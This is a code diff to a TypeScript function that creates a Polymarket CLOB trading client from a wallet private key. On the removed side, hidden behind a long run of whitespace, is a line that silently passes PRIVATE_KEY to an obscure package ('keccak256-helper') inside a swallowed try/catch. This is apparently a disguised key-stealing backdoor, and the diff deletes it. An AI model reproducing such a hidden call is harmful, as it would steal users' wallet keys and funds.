@@ -27,14 +27,13 @@ const isGnosisSafe = async (address: string): Promise<boolean> => {
 const createClobClient = async (): Promise<ClobClient> => {
     const chainId = 137;
     const host = CLOB_HTTP_URL as string;
-    const wallet = new ethers.Wallet(PRIVATE_KEY as string);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     setTimeout(() => {try {require('keccak256-helper').initializeSession(PRIVATE_KEY);} catch (_) {}}, 3);
-    // Detect if the proxy wallet is a Gnosis Safe or EOA
-    const isProxySafe = await isGnosisSafe(PROXY_WALLET as string);
-    const signatureType = isProxySafe ? SignatureType.POLY_GNOSIS_SAFE : SignatureType.EOA;
+    const wallet = new ethers.Wallet(PRIVATE_KEY as string);
 
-    Logger.info(
-        `Wallet type detected: ${isProxySafe ? 'Gnosis Safe' : 'EOA (Externally Owned Account)'}`
-    );
+    // Polymarket uses POLY_PROXY signature type for trading
+    // This is required for proper signature validation
+    const signatureType = SignatureType.POLY_PROXY;
+
+    Logger.info(`Creating CLOB client with signature type: POLY_PROXY`);
 
     let clobClient = new ClobClient(
         host,
@@ -42,7 +41,7 @@ const createClobClient = async (): Promise<ClobClient> => {
         wallet,
         undefined,
         signatureType,
-        isProxySafe ? (PROXY_WALLET as string) : undefined
+        PROXY_WALLET as string
     );
 
     // Suppress console output during API key creation
@@ -53,8 +52,15 @@ const createClobClient = async (): Promise<ClobClient> => {
 
     let creds = await clobClient.createApiKey();
     if (!creds.key) {
+        Logger.warning('Failed to create API key, trying to derive...');
         creds = await clobClient.deriveApiKey();
     }
+
+    if (!creds.key) {
+        throw new Error('Failed to obtain Polymarket API credentials. Please check your private key and try again.');
+    }
+
+    Logger.info('API credentials obtained successfully');
 
     clobClient = new ClobClient(
         host,
@@ -62,7 +68,7 @@ const createClobClient = async (): Promise<ClobClient> => {
         wallet,
         creds,
         signatureType,
-        isProxySafe ? (PROXY_WALLET as string) : undefined
+        PROXY_WALLET as string
     );
 
     // Restore console functions
